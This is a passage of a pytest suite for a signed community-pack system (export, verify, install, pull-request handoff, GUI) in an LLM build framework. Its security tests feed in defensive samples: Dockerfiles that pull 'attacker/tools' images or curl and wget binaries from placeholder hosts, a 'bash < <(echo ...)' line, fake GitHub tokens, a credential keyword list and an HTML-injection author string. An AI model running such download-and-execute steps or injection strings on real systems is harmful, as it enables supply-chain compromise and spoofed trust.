            assert [e["content"] for e in json.loads(zf.read("knowledge.json"))] == ["mine"]
        assert any(n.startswith("1 page(s) imported from installed community knowledge packs were left out")
                   for n in result.notes), result.notes
        world.rag.records = world.rag.records[1:]
        with pytest.raises(PackError, match="nothing to export"):
            world.cm.export_pack("knowledge", author="mallory", pack_id="docs")

    def test_the_note_counts_left_out_pages_not_their_chunks(self, world):
        world.rag.records = [{"source": "https://docs.invalid/a", "content": "mine", "metadata": {}}] + [
            {"source": f"https://docs.invalid/{page}", "content": f"alice's part {i}",
             "metadata": {"origin_pack": "alice-notes"}} for page in ("b", "c") for i in range(3)]
        result = world.cm.export_pack("knowledge", author="mallory", pack_id="docs")
        assert any(n.startswith("2 page(s) imported from installed community knowledge packs were left out")
                   for n in result.notes), result.notes

    def test_knowledge_keeps_its_sources_and_claims_no_licence(self, world):
        world.rag.records = [{"source": "https://docs.invalid/a", "content": "page", "metadata": {}},
                             {"source": "", "content": "nobody knows where from", "metadata": {}}]
        result = world.cm.export_pack("knowledge", author="a", pack_id="docs")
        assert result.manifest.license == "NOASSERTION", "web pages are not the exporter's to license"
        with zipfile.ZipFile(result.path) as zf:
            assert [e["source"] for e in json.loads(zf.read("knowledge.json"))] == ["https://docs.invalid/a"]
        assert any("keeps its source" in n for n in result.notes)
        make_target(world.root / "targets" / "own-board")
        assert world.cm.export_pack("target", "own-board", author="a").manifest.license == "MIT"

    def test_a_target_with_a_pinned_image_survives_export_and_ci(self, world):
        folder = make_target(world.root / "targets" / "sdk-board")
        dockerfile = "FROM ghcr.io/acme/rk-sdk@sha256:" + "ab" * 32 + "\nRUN echo ok\n"
        (folder / "Dockerfile").write_bytes(dockerfile.encode("utf-8"))  # exactly these bytes, on every host
        result = world.cm.export_pack("target", "sdk-board", author="a")
        assert not [name for name, _ in result.changes]
        with zipfile.ZipFile(result.path) as zf:
            assert zf.read("Dockerfile").decode() == dockerfile
        assert CommunityManager(None).verify_file(result.path)[1] == []

    def test_an_installed_community_pack_is_not_re_signed_as_your_own(self, world):
        world.add(world.target_pack())
        world.publish()
        world.install()
        with pytest.raises(PackError, match="alice's community pack"):
            world.cm.export_pack("target", "demo-board", author="mallory", license="CC0-1.0")
        assert not list(world.cm.contributions_dir.glob("*.zip"))

    def test_encrypted_export_for_private_sharing(self, world):
        make_target(world.root / "targets" / "team-board")
        friend = pyrage.x25519.Identity.generate()  # also made with age-keygen or rage-keygen
        result = world.cm.export_pack("target", "team-board", author="a", recipients=[friend.to_public()])
        assert result.encrypted and result.path.suffix == ".lcfpack"
        data, sender = cp.decrypt_pack(result.path.read_bytes(), identity=friend)
        assert sender == result.signer and cp.read_manifest(data).id == "team-board"


# --- pull request handoff -------------------------------------------------------------------------------------

class TestHandoff:

    def test_without_gh_the_upload_page_opens(self, tmp_path):
        opened, calls = [], []
        msg = submit_contribution(tmp_path / "contribution-target-x-1.0.0.zip", REPO, "target",
                                  runner=lambda *a, **k: calls.append(a), which=lambda name: None,
                                  opener=opened.append)
        assert opened == [f"https://github.com/{REPO}/upload/main/contributions/target"] and calls == []
        assert "contribution-target-x-1.0.0.zip" in msg

    def test_gh_opens_a_pull_request_and_never_handles_a_token(self, tmp_path, monkeypatch):
        monkeypatch.setenv("GH_TOKEN", "ghp_" + "Q" * 36)
        monkeypatch.setattr("keyring.get_password", lambda *a: pytest.fail("the keyring was read"))
        pack = tmp_path / "contribution-target-x-1.0.0.zip"
        pack.write_bytes(b"zip")
        calls = []

        def runner(cmd, **kwargs):
            calls.append(cmd)
            assert "env" not in kwargs, "the child inherits the environment; nothing is passed or read"
            if cmd[1:3] == ["repo", "fork"]:
                (Path(kwargs["cwd"]) / "community").mkdir()
            out = {"api": "octo-cat\n", "pr": "https://github.com/lcf-example/community/pull/7\n"}.get(cmd[1], "")
            return subprocess.CompletedProcess(cmd, 0, out, "")

        msg = submit_contribution(pack, REPO, "target", runner=runner, which=lambda name: f"/usr/bin/{name}",
                                  opener=lambda url: pytest.fail("browser opened"))
        assert msg.endswith("/pull/7")
        tools = [(Path(c[0]).name, c[1] if c[1] != "-C" else c[3]) for c in calls]
        assert tools == [("gh", "auth"), ("gh", "api"), ("gh", "repo"), ("git", "switch"), ("git", "add"),
                         ("git", "commit"), ("git", "push"), ("gh", "pr")]
        assert ["--head", "octo-cat:contribution-contribution-target-x-1.0.0"] == calls[-1][5:7]
        assert not any("ghp_" in arg or "@github.com" in arg for c in calls for arg in c)

    def test_gh_failure_falls_back_to_the_browser(self, tmp_path):
        opened = []

        def runner(cmd, **kwargs):
            if cmd[1] == "auth":
                return subprocess.CompletedProcess(cmd, 0, "", "")
            raise subprocess.CalledProcessError(1, cmd, stderr="permission denied")

        msg = submit_contribution(tmp_path / "p.zip", REPO, "recipe", runner=runner, which=lambda n: n,
                                  opener=opened.append)
        assert opened and "permission denied" in msg

    def test_credentials_in_tool_output_are_never_shown(self, tmp_path):
        token = "ghp_" + "Q" * 36

        def runner(cmd, **kwargs):
            if cmd[1] == "auth":
                return subprocess.CompletedProcess(cmd, 0, "", "")
            raise subprocess.CalledProcessError(1, cmd, stderr=f"fatal: unable to access 'https://octo:{token}@"
                                                               "github.com/o/r' and https://bot:hunter2@x.invalid/")
        msg = submit_contribution(tmp_path / "p.zip", REPO, "recipe", runner=runner, which=lambda n: n,
                                  opener=lambda url: None)
        assert token not in msg and "hunter2" not in msg and "octo" not in msg
        assert "https://github.com/o/r" in msg

    def test_no_repository_configured(self, tmp_path):
        with pytest.raises(PackError, match="community_repo"):
            submit_contribution(tmp_path / "p.zip", "", "target", opener=lambda u: pytest.fail("opened"))

    def test_handoff_code_reads_no_credentials(self):
        source = inspect.getsource(zoo_mod.submit_contribution) + inspect.getsource(zoo_mod._submit_with_gh)
        for forbidden in ("environ", "getenv", "get_secret", "keyring", "getpass", "env="):
            assert forbidden not in source


# --- generator and wizard -------------------------------------------------------------------------------------

class TestGenerator:

    @pytest.fixture
    def generator(self, tmp_path):
        from orchestrator.Core.module_generator import ModuleGenerator
        (tmp_path / "targets").mkdir()
        return ModuleGenerator(tmp_path / "targets")

    def data(self, **kw):
        values = dict(module_name="My Board", architecture="aarch64",
                      quantization_logic='    Q4_K_M|"Q8_0") echo quantize ;;', supported_boards=["Board One"])
        values.update(kw)
        return values

    def test_target_yml_has_community_capabilities_and_no_placeholders(self, generator):
        import yaml
        from orchestrator.schemas.targets import SupportLevel, TargetCapabilities
        target = generator.generate_module(self.data())
        text = (target / "target.yml").read_text()
        assert "[" not in text and "YYYY-MM-DD" not in text
        meta = yaml.safe_load(text)
        caps = TargetCapabilities.model_validate(meta["capabilities"])
        assert caps.support_level == SupportLevel.COMMUNITY and list(caps.boards) == ["board_one"]
        assert caps.formats["gguf"].quantizations == ["Q4_K_M", "Q8_0"]
        assert meta["metadata"]["created"] == date.today().isoformat()
        assert not (target / "knowledge").exists()

    def test_leftover_placeholder_fails_generation(self, generator, tmp_path):
        import shutil
        from conftest import REPO_ROOT
        template = tmp_path / "template"
        shutil.copytree(REPO_ROOT / "targets" / "_template", template)
        with open(template / "target.yml", "a", encoding="utf-8") as f:
            f.write('\nsupport_contact: "[Your e-mail]"\n')
        generator.template_dir = template
        with pytest.raises(ValueError, match="placeholder"):
            generator.generate_module(self.data())
        assert not (generator.targets_dir / "my_board").exists()

    def test_the_official_target_passes_the_community_validators(self, tmp_path):
        # A board variant made from the shipped target must be shareable (bash arrays, 'done < <(grep ...)').
        from conftest import REPO_ROOT
        from orchestrator.Core.module_generator import validate_target_folder
        shutil.copytree(REPO_ROOT / "targets" / "Rockchip", tmp_path / "rk-variant")
        assert validate_target_folder(tmp_path / "rk-variant") == []

    def test_every_image_a_dockerfile_pulls_must_be_pinned(self, tmp_path):
        from orchestrator.Core.module_generator import validate_target_folder
        lower = make_target(tmp_path / "lower")
        (lower / "Dockerfile").unlink()
        (lower / "dockerfile").write_text("FROM attacker/tools:latest\n")  # the builder builds this name too
        assert any("FROM attacker/tools:latest must be pinned" in p for p in validate_target_folder(lower))
        copy = make_target(tmp_path / "copy")
        (copy / "Dockerfile").write_text("FROM debian:bookworm-slim AS builder\n# COPY --from=example/ignored\n"
                                         "COPY --from=builder /a /b\nCOPY --from=0 /c /d\n"
                                         "RUN --mount=type=bind,from=attacker/tools:1,target=/t true\n"
                                         "COPY --from=attacker/tools:latest /x /y\n")
        assert [p.split(": ", 1)[1] for p in validate_target_folder(copy)] == [
            "from=attacker/tools:1 must be pinned by digest (image@sha256:...)",
            "from=attacker/tools:latest must be pinned by digest (image@sha256:...)"]
        assert any("runs generated code" in p for p in validate_target_folder(
            make_target(tmp_path / "sub", script="bash < <(echo 'echo hi')\n")))

    @pytest.mark.parametrize("dockerfile, files, finding", [
        ("FROM ghcr.io/ggml-org/llama.cpp:server-cuda@sha256:" + "b" * 64 + "\n", {},
         "Dockerfile:1: pulls a prebuilt llama.cpp image"),
        ("FROM debian:bookworm-slim\nCOPY --from=ghcr.io/ggerganov/llama.cpp:full /app/llama-quantize /usr/bin/\n",
         {}, "Dockerfile:2: pulls a prebuilt llama.cpp image"),
        ("FROM debian:bookworm-slim\nCOPY --from=acme/tools@sha256:" + "c" * 64 + " /usr/bin/llama-server /usr/bin/\n",
         {}, "Dockerfile:2: copies llama.cpp binaries out of the image acme/tools"),
        ("FROM debian:bookworm-slim\nRUN curl -fsSLO \\\n    https://github.com/ggml-org/llama.cpp/releases/download/"
         "b11429/llama-b11429-bin-ubuntu-x64.tar.gz\n", {}, "Dockerfile:2: downloads a llama.cpp release archive"),
        ("FROM debian:bookworm-slim\nRUN wget -O /usr/local/bin/llama-server https://mirror.invalid/x\n", {},
         "Dockerfile:2: downloads llama.cpp binaries (llama-server)"),
        ("FROM debian:bookworm-slim\nADD https://mirror.invalid/llama-cli /usr/bin/llama-cli\n", {},
         "Dockerfile:2: downloads llama.cpp binaries (llama-cli)"),
        ("FROM debian:trixie-slim\nRUN apt-get update && apt-get install -y llama.cpp\n", {},
         "Dockerfile:2: installs a prebuilt llama.cpp package"),
        ("FROM ghcr.io/smilez1985/llm-runtime:latest@sha256:" + "d" * 64 + "\n", {},
         "Dockerfile:1: pulls a prebuilt llama.cpp image"),
        ("FROM debian:bookworm-slim\n", {"scripts/fetch.py": "import urllib.request\nurllib.request.urlretrieve("
                                         "'https://github.com/ggml-org/llama.cpp/releases/latest/download/x.zip')\n"},
         "scripts/fetch.py:2: downloads a llama.cpp release archive"),
        # A foreign image behind a stage name is still a foreign image (review of WP9).
        ("FROM acme/tools@sha256:" + "e" * 64 + " AS tools\nFROM debian:bookworm-slim\n"
         "COPY --from=tools /usr/bin/llama-server /usr/bin/\n", {},
         "Dockerfile:3: copies llama.cpp binaries out of the image acme/tools"),
        ("FROM acme/tools@sha256:" + "e" * 64 + " AS tools\nFROM tools AS again\nFROM debian:bookworm-slim\n"
         "COPY --from=1 /usr/lib/libllama.so /usr/lib/\n", {},
         "Dockerfile:4: copies llama.cpp binaries out of the image acme/tools"),
        # A pipeline is one command: the download feeds the unpacking of the binary.
        ("FROM debian:bookworm-slim\nARG U=https://mirror.invalid/tools.tgz\n"
         "RUN curl -fsSL \"$U\" | tar -xz -C /usr/local/bin llama-server\n", {},
         "Dockerfile:3: downloads llama.cpp binaries (llama-server)"),
        # A script without a known suffix that the Dockerfile runs is still a script.
        ("FROM debian:bookworm-slim\nCOPY scripts/ /s/\nRUN sh /s/setup\n",
         {"scripts/setup": "#!/bin/sh\nwget -qO /usr/local/bin/llama-quantize https://mirror.invalid/q\n"},
         "scripts/setup:2: downloads llama.cpp binaries (llama-quantize)"),
    ])
    def test_prebuilt_llama_cpp_is_flagged(self, tmp_path, dockerfile, files, finding):
        from orchestrator.Core.module_generator import validate_target_folder
        target = make_target(tmp_path / "t", dockerfile=dockerfile)
        for rel, text in files.items():
            (target / rel).parent.mkdir(parents=True, exist_ok=True)
            (target / rel).write_text(text)
        problems = validate_target_folder(target)
        assert any(p.startswith(finding) and "build llama.cpp from source" in p for p in problems), problems

    def test_building_llama_cpp_from_source_is_not_flagged(self, tmp_path):
        """Fetching the source, compiling the tools and naming them is the recipe, not a prebuilt binary."""
        from orchestrator.Core.module_generator import validate_target_folder
        target = make_target(tmp_path / "t", dockerfile=(
            "FROM debian:bookworm-slim\nRUN apt-get update && apt-get install -y curl git cmake && \\\n"
            "    git clone https://github.com/ggml-org/llama.cpp /src && \\\n"
            "    cmake --build /src/build --target llama-quantize llama-bench\n"
            "# FROM ghcr.io/ggml-org/llama.cpp:full (a comment is not an instruction)\n"
            "RUN pip install llama-cpp-python\n"))
        assert validate_target_folder(target) == []

    def test_binaries_built_in_an_earlier_stage_may_be_copied_on(self, tmp_path):
        """Multi-stage builds of the recipe: the tools compiled in one stage, copied into the next and from there into
        a third stage, are built from source (only a stage that never builds them is a foreign image)."""
        from orchestrator.Core.module_generator import validate_target_folder
        target = make_target(tmp_path / "t", dockerfile=(
            "FROM debian:bookworm-slim AS builder\n"
            "RUN cmake -S /src -B /src/build && cmake --build /src/build --target llama-quantize\n"
            "FROM debian:bookworm-slim AS runtime\n"
            "COPY --from=builder /src/build/bin/llama-quantize /usr/local/bin/\n"
            "FROM runtime AS final\n"
            "COPY --from=runtime /usr/local/bin/llama-quantize /opt/bin/\n"
            "COPY --from=0 /src/build/bin/libllama.so /opt/lib/\n"
            "RUN curl -fsSL https://example.invalid/calibration.txt | sha256sum -c sums.txt && \\\n"
            "    /opt/bin/llama-quantize --help\n"))
        (target / "modules" / "README").write_text("Download llama-server with curl? No: it is built here.\n")
        assert validate_target_folder(target) == []

    def test_knowledge_snapshot_is_opt_in_and_target_scoped(self, generator, world):
        world.rag.records = [{"source": "a", "content": "board doc", "metadata": {"root_url": "https://b.invalid"}},
                             {"source": "b", "content": "unrelated", "metadata": {"root_url": "https://x.invalid"}}]
        plain = generator.generate_module(self.data(module_name="Plain"), world.framework)
        assert not (plain / "knowledge").exists(), "nothing of the knowledge base without a request"
        scoped = generator.generate_module(self.data(module_name="Scoped"), world.framework,
                                           knowledge_roots=["https://b.invalid"])
        snapshot = json.loads((scoped / "knowledge" / "initial_knowledge.json").read_text())
        assert [e["content"] for e in snapshot] == ["board doc"]

    def test_a_crawled_page_with_placeholder_text_does_not_break_the_module(self, generator, world):
        """The snapshot is data, not template output: a page that writes dates as YYYY-MM-DD used to fail the
        generation and delete the new target (and would fail its export and install)."""
        from orchestrator.Core.module_generator import validate_target_folder
        world.rag.records = [{"source": "https://b.invalid/dates", "content": "Dates are YYYY-MM-DD; see [MODULE_NAME].",
                              "metadata": {"root_url": "https://b.invalid"}}]
        target = generator.generate_module(self.data(), world.framework, knowledge_roots=["https://b.invalid"])
        assert "YYYY-MM-DD" in (target / "knowledge" / "initial_knowledge.json").read_text()
        assert validate_target_folder(target) == []
        (target / "knowledge" / "README.md").write_text("Created YYYY-MM-DD\n")   # our own files are still checked
        assert validate_target_folder(target) == ["template placeholder left: knowledge/README.md: YYYY-MM-DD"]

    def test_the_knowledge_readme_says_what_the_snapshot_is(self, generator, world):
        world.rag.records = [{"source": "a", "content": "board doc", "metadata": {"root_url": "https://b.invalid"}}]
        target = generator.generate_module(self.data(), world.framework, knowledge_roots=["https://b.invalid"])
        readme = (target / "knowledge" / "README.md").read_text(encoding="utf-8")
        for claim in ("vectorized", "Qdrant", "automatically"):   # nothing reads initial_knowledge.json
            assert claim not in readme
        for fact in ("initial_knowledge.json", "privacy scrub", "source", "does not read this file",
                     "llm-cli zoo export knowledge"):
            assert fact in readme


def test_wizard_snapshot_and_export_are_off_by_default(qapp, tmp_path):
    from orchestrator.gui.wizards import ModuleCreationWizard
    wizard = ModuleCreationWizard(tmp_path / "targets")
    try:
        wizard.update_summary()
        assert not wizard.chk_knowledge.isChecked() and not wizard.chk_knowledge.isEnabled()
        assert not wizard.chk_export.isChecked()
        wizard.crawled_roots.add("https://docs.invalid")
        wizard.update_summary()
        assert wizard.chk_knowledge.isEnabled() and not wizard.chk_knowledge.isChecked()
    finally:
        wizard.close()


# --- CLI ------------------------------------------------------------------------------------------------------

def invoke(world, *args, input=None):
    from orchestrator import cli as cli_module

    framework = SimpleNamespace(get_component=lambda n: world.cm if n == "community_manager" else None,
                                target_manager=None, secrets_manager=world.secrets, config=world.config)

    class Ctx(cli_module.FrameworkContext):
        def require_framework(self):
            self.framework_manager = framework
            return self

    return CliRunner().invoke(cli_module.cli, ["-q", "zoo", *args], obj=Ctx(), input=input)


class TestCli:

    def test_commands(self):
        from orchestrator.cli import cli
        assert {"list", "show", "install", "verify", "export", "keys"} <= set(cli.commands["zoo"].commands)

    def test_list_install_and_verify(self, world):
        world.add(world.target_pack())
        world.publish()
        listed = invoke(world, "list", "--json")
        assert json.loads(listed.stdout)[0]["trust"] == "community"
        result = invoke(world, "install", "demo-board", "--yes")
        assert result.exit_code == 0, result.output
        assert (world.root / "targets" / "demo-board" / PROVENANCE_NAME).is_file()
        assert invoke(world, "verify").exit_code == 0

    def test_yes_skips_the_question_only_for_packs_the_index_lists(self, world, tmp_path):
        from orchestrator.cli import cli
        rule = "a file without an index entry is 'local' and is always confirmed"
        assert rule in " ".join(cli.commands["zoo"].commands["install"].get_help(
            __import__("click").Context(cli)).split())
        (tmp_path / "p.zip").write_bytes(world.target_pack())
        result = invoke(world, "install", "--file", str(tmp_path / "p.zip"), "--yes")
        assert result.exit_code == 1 and "No terminal" in result.output and rule in " ".join(result.output.split())
        assert not (world.root / "targets" / "demo-board").exists()
        world.add((tmp_path / "p.zip").read_bytes())  # now the signed index lists this file
        world.publish()
        result = invoke(world, "install", "--file", str(tmp_path / "p.zip"), "--yes")
        assert result.exit_code == 0, result.output
        assert json.loads((world.root / "targets" / "demo-board" / PROVENANCE_NAME).read_text())["trust"] == "community"

    def test_an_encrypted_file_opens_with_my_key(self, world, tmp_path):
        me = cp.UserKeys(world.secrets).age_identity()
        data = world.target_pack()
        world.add(data)
        world.publish()
        (tmp_path / "p.lcfpack").write_bytes(cp.encrypt_pack(data, sender=Ed25519PrivateKey.generate(),
                                                             recipients=[me.to_public()]))
        result = invoke(world, "install", "--file", str(tmp_path / "p.lcfpack"), "--yes")
        assert result.exit_code == 0, result.output
        assert "sent by key" in result.output

    def test_verify_rejects_a_pack_with_a_key_and_ci_relies_on_it(self, world, tmp_path):
        from conftest import REPO_ROOT
        root = tmp_path / "k"
        root.mkdir()
        page = f"restore with {pyrage.x25519.Identity.generate()}"  # a real age secret key, made at runtime
        (root / "knowledge.json").write_text(json.dumps([{"source": "https://docs.invalid", "content": page}]))
        (tmp_path / "k.zip").write_bytes(pack_bytes(root, kind="knowledge", pack_id="notes", version="1.0.0"))
        result = invoke(world, "verify", str(tmp_path / "k.zip"))
        assert result.exit_code == 1 and "privacy scrub" in result.output
        # The secret scan skips binary files, so the workflow does not pretend to run it on the zips.
        workflow = (REPO_ROOT / "scripts" / "community_repo" / "validate-contribution.yml").read_text()
        assert "llm-cli zoo verify" in workflow and "secret_scan.py" not in workflow

    def test_verify_a_pack_file(self, world, tmp_path):
        (tmp_path / "good.zip").write_bytes(world.target_pack())
        assert invoke(world, "verify", str(tmp_path / "good.zip")).exit_code == 0
        (tmp_path / "bad.zip").write_bytes(world.target_pack(name="bad", script="wget https://x.invalid/a\n"))
        bad = invoke(world, "verify", str(tmp_path / "bad.zip"))
        assert bad.exit_code == 1 and "downloads" in bad.output

    def test_export_and_keys(self, world):
        make_target(world.root / "targets" / "cli-board")
        result = invoke(world, "export", "target", "cli-board", "--author", "pat")
        assert result.exit_code == 0, result.output
        assert "Privacy scrub" in result.output and "signed with key" in result.output
        keys = invoke(world, "keys")
        assert keys.output.count("ed25519:") == 1 and keys.output.count("\nage1") == 1
        assert [type(k).__name__ for k in cp.parse_public_keys(keys.output)] == ["Recipient", "Ed25519PublicKey"]

    def test_keys_or_a_passphrase_not_both(self, world, tmp_path):
        make_target(world.root / "targets" / "cli-board")
        (tmp_path / "friend.keys").write_text(str(pyrage.x25519.Identity.generate().to_public()))
        result = invoke(world, "export", "target", "cli-board", "--author", "pat", "--to",
                        str(tmp_path / "friend.keys"), "--passphrase", input="x" * 12 + "\n")
        assert result.exit_code == 2 and "not both" in result.output and "Passphrase" not in result.output

    def test_a_binary_key_file_is_a_clear_usage_error(self, world, tmp_path):
        me = cp.UserKeys(world.secrets).age_identity()
        (tmp_path / "p.lcfpack").write_bytes(cp.encrypt_pack(world.target_pack(), sender=Ed25519PrivateKey.generate(),
                                                             recipients=[me.to_public()]))
        (tmp_path / "key.bin").write_bytes(b"\xff\xfe\x00\x81 not text")
        result = invoke(world, "install", "--file", str(tmp_path / "p.lcfpack"), "--from", str(tmp_path / "key.bin"))
        output = " ".join(result.output.split())  # the console wraps long lines
        assert result.exit_code == 2 and "is not a text file with public keys" in output, output
        assert not isinstance(result.exception, UnicodeDecodeError)
        make_target(world.root / "targets" / "cli-board")
        result = invoke(world, "export", "target", "cli-board", "--author", "pat", "--to", str(tmp_path / "key.bin"))
        output = " ".join(result.output.split())
        assert result.exit_code == 2 and "is not a text file with public keys" in output, output

    def test_from_is_refused_for_a_plain_pack(self, world, tmp_path):
        (tmp_path / "p.zip").write_bytes(world.target_pack())
        (tmp_path / "alice.keys").write_text(invoke(world, "keys").output, encoding="utf-8")
        result = invoke(world, "install", "--file", str(tmp_path / "p.zip"), "--from", str(tmp_path / "alice.keys"))
        output = " ".join(result.output.split())
        assert result.exit_code == 2 and "--from applies only to encrypted packs" in output, output
        assert not (world.root / "targets" / "demo-board").exists()

    def test_pr_submits_only_after_the_summary_was_confirmed(self, world, monkeypatch):
        make_target(world.root / "targets" / "pr-board")
        submitted = []
        monkeypatch.setattr(zoo_mod, "submit_contribution", lambda *a: submitted.append(a) or "Pull request opened")
        result = invoke(world, "export", "target", "pr-board", "--author", "pat", "--pr")
        assert result.exit_code == 1 and "Not submitted" in result.output and submitted == [], "no terminal: no"
        assert "Privacy scrub" in result.output, "the summary comes first"
        result = invoke(world, "export", "target", "pr-board", "--author", "pat", "--pr", "--yes")
        assert result.exit_code == 0 and len(submitted) == 1, result.output


def test_mcp_and_ditto_have_no_zoo_or_upload_tools(booted_framework):
    names = {spec.name for spec in booted_framework.tool_registry.list()}
    assert not any(word in name for name in names for word in ("zoo", "community", "upload", "install"))
    # Packs reach AI callers only from the signed index and only to a local file (MCP design T9; DECISIONS round 1
    # item 3): never a pull request, never a publication, never a pack from a file.
    assert not any(word in name for name in names for word in ("submit", "publish", "pull_request"))
    assert {"list_packs", "add_pack_from_index", "export_pack"} <= names
    for name in ("add_pack_from_index", "export_pack"):
        fields = set(booted_framework.tool_registry.get(name).input_model.model_fields)
        assert not fields & {"file", "path", "url", "pr", "repo", "recipients", "passphrase", "out", "out_dir"}, name


def test_automation_code_never_publishes_or_installs_a_pack_from_a_file():
    """No code an AI drives (the MCP server, Ditto, the tools, the provider layer) reaches submit_contribution (a
    pull request under the person's GitHub login) or prepare_install_file (an unreviewed pack an AI could write)."""
    import ast
    from conftest import REPO_ROOT
    files = [REPO_ROOT / "orchestrator/mcp_server.py", REPO_ROOT / "orchestrator/Core/ditto_manager.py"]
    for folder in ("orchestrator/tools", "orchestrator/llm"):
        files += sorted((REPO_ROOT / folder).rglob("*.py"))
    forbidden = {"submit_contribution", "_submit_with_gh", "prepare_install_file", "decrypt_pack", "verify_file"}
    offenders = []
    for path in files:
        for node in ast.walk(ast.parse(path.read_text(encoding="utf-8"))):
            names = []
            if isinstance(node, ast.Attribute):
                names.append(node.attr)
            elif isinstance(node, ast.Name):
                names.append(node.id)
            elif isinstance(node, ast.Constant) and isinstance(node.value, str):
                names.append(node.value)
            elif isinstance(node, (ast.Import, ast.ImportFrom)):
                names += [a.name for a in node.names]
            offenders += [f"{path.relative_to(REPO_ROOT)}:{node.lineno}: {n}" for n in names if n in forbidden]
    assert len(files) > 5 and offenders == []


# --- GUI ------------------------------------------------------------------------------------------------------

def wait(hub, qapp):
    for _ in range(50):
        for task in list(hub._tasks):
            task.wait(5000)
        qapp.processEvents()
        if not any(t.isRunning() for t in hub._tasks):
            qapp.processEvents()
            return


def test_hub_smoke(qapp, world, tmp_path, monkeypatch):
    from PySide6.QtWidgets import QMessageBox
    from orchestrator.gui import community_hub
    from test_recipes import recipe_data
    monkeypatch.setattr(community_hub.QMessageBox, "warning", lambda *a: pytest.fail(f"error shown: {a}"))
    monkeypatch.setattr(community_hub.QMessageBox, "exec", lambda self: QMessageBox.Yes)
    world.add(world.target_pack())
    world.add(world.target_pack(name="revoked-board"), pack_id="revoked-board")
    world.revoked.append({"kind": "target", "id": "revoked-board", "reason": "broken"})
    world.publish()
    root = tmp_path / "r"
    root.mkdir()
    data = recipe_data()
    data.update(id="demo-recipe", target={"id": "demo-board", "pack_sha256": "a" * 64}, format="gguf",
                board="demo", quantization="Q8_0")
    (root / "recipe.yml").write_text(json.dumps(data))
    (tmp_path / "r.zip").write_bytes(pack_bytes(root, kind="recipe", pack_id="demo-recipe", version="1.0.0"))
    world.cm.finish_install(world.cm.prepare_install_file(tmp_path / "r.zip"))

    built = []
    framework = SimpleNamespace(community_manager=world.cm, target_manager=None, secrets_manager=world.secrets)
    hub = community_hub.CommunityHubWindow(framework, on_build_recipe=built.append)
    try:
        wait(hub, qapp)
        rows = {hub.table.item(r, 0).text(): (hub.table.item(r, 3).text(), hub.table.cellWidget(r, 6).text())
                for r in range(hub.table.rowCount())}
        assert rows == {"Demo-Board": ("community", "Install"), "Revoked-Board": ("revoked", "Revoked"),
                        "demo-recipe": ("local", "Build")}
        hub.trust_filter.setCurrentIndex(hub.trust_filter.findData("revoked"))
        assert hub.table.rowCount() == 1
        hub.trust_filter.setCurrentIndex(0)
        hub.kind_filter.setCurrentIndex(hub.kind_filter.findData("recipe"))
        hub.table.cellWidget(0, 6).click()
        assert built[0].id == "demo-recipe" and built[0].quantization == "Q8_0"
        hub.kind_filter.setCurrentIndex(hub.kind_filter.findData("target"))
        installed = []
        hub.installed.connect(installed.append)
        next(hub.table.cellWidget(r, 6) for r in range(hub.table.rowCount())
             if hub.table.cellWidget(r, 6).text() == "Install").click()
        wait(hub, qapp)
        assert installed == ["target"] and (world.root / "targets" / "demo-board").is_dir()
        assert "QInputDialog" not in Path(community_hub.__file__).read_text()
    finally:
        hub.close()


def test_hub_never_renders_pack_text_as_html(qapp, world, tmp_path, monkeypatch):
    from PySide6.QtCore import Qt
    from PySide6.QtGui import QTextDocument
    from PySide6.QtWidgets import QMessageBox
    from orchestrator.gui import community_hub
    # As HTML this author name would show "Trust: verified" and hide the local-pack warning after it.
    author = 'x<p>Trust: verified (reviewed)</p><!--'
    (tmp_path / "p.zip").write_bytes(world.target_pack(author=author))
    prepared = world.cm.prepare_install_file(tmp_path / "p.zip")
    html = QTextDocument()
    html.setHtml(prepared.summary())
    assert "WARNING" not in html.toPlainText(), "the attack works when the summary is rendered as HTML"
    shown = []
    monkeypatch.setattr(community_hub.QMessageBox, "exec",
                        lambda self: shown.append((self.textFormat(), self.text())) or QMessageBox.No)
    framework = SimpleNamespace(community_manager=world.cm, target_manager=None, secrets_manager=world.secrets)
    hub = community_hub.CommunityHubWindow(framework)
    try:
        wait(hub, qapp)
        hub.confirm_install(prepared)
        assert shown[0][0] == Qt.PlainText and "WARNING" in shown[0][1]
        assert hub.status_label.textFormat() == Qt.PlainText
        warned = []
        monkeypatch.setattr(community_hub.QMessageBox, "warning", lambda parent, title, text: warned.append(text))
        hub.on_error("<b>x</b>: not in the manifest<!--")  # errors quote zip member names
        html.setHtml(warned[0])
        assert html.toPlainText() == "<b>x</b>: not in the manifest<!--"
    finally:
        world.cm.discard(prepared)
        hub.close()


def test_builder_fills_in_a_recipe_with_its_commit(qapp, booted_framework, monkeypatch):
    from orchestrator.schemas.recipes import Recipe
    from test_recipes import recipe_data
    from test_review_capabilities_paths import make_tab, submit
    monkeypatch.setattr("orchestrator.gui.builder_tab.QMessageBox.information", lambda *a: None)
    tab = make_tab(booted_framework)
    data = recipe_data()
    data.update(target={"id": "Rockchip", "pack_sha256": "a" * 64}, format="rkllm", board="rk3576",
                quantization="w4a16")
    recipe = Recipe.model_validate(data)
    tab.apply_recipe(recipe)
    req = submit(tab)
    assert (req.models, req.targets, req.target_board, req.quantization_options) == (
        [recipe.model.repo], ["Rockchip"], "rk3576", ["w4a16"])
    assert req.model_revision == recipe.model.revision
    tab.model_input.setCurrentText("Qwen/Qwen3.5-0.8B")
    assert submit(tab).model_revision is None, "another model is not pinned to the recipe's commit"


def test_download_helper_get_bytes_is_https_only(tmp_path):
    from orchestrator.utils.download import DownloadError, PinnedDownloader
    session = FakeSession()
    session.files["https://a.invalid/x"] = b"abc"
    session.redirects["https://a.invalid/x"] = "http://a.invalid/x"
    with pytest.raises(DownloadError, match="away from HTTPS"):
        PinnedDownloader(session).get_bytes("https://a.invalid/x", 10)
    assert session.calls == ["https://a.invalid/x"]


def test_maintainer_signing_script(tmp_path, memory_keyring, capsys, world):
    import importlib.util
    import yaml
    from conftest import REPO_ROOT
    spec = importlib.util.spec_from_file_location("zoo_sign_index", REPO_ROOT / "scripts" / "zoo_sign_index.py")
    tool = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(tool)
    assert tool.main(["keygen", "maintainers"]) == 0
    key = cp.TrustedKey.model_validate(yaml.safe_load(capsys.readouterr().out)[0])
    assert tool.main(["keygen", "maintainers"]) == 1, "an existing key is never replaced"
    (tmp_path / "p.zip").write_bytes(world.target_pack())
    assert tool.main(["entry", str(tmp_path / "p.zip"), "--url", "https://zoo.invalid/p.zip"]) == 0
    entry = json.loads(capsys.readouterr().out)
    index = tmp_path / "index.json"
    index.write_text(json.dumps({"schema_version": 1, "version": 2, "generated": "2026-10-11T12:00:00Z",
                                 "entries": [entry]}))
